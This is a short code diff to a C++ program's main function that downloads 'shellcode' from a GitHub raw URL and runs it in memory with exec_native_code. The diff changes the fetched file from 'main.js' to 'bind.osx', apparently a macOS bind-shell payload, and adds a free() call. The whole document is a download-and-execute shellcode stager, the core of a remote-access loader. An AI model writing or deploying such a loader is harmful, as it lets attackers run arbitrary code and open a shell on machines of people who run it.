@@ -13,8 +13,9 @@
 int
 main(void)
 {
-    webcc cc("raw.githubusercontent.com", "/firebroo/test/master/main.js"); 
+    webcc cc("raw.githubusercontent.com", "/firebroo/test/master/bind.osx"); 
     std::pair<unsigned char*, int> shellcode = cc.received_shellcode();
     exec_native_code(shellcode.first, shellcode.second);
+    free(shellcode.first);
     return 0;
 }
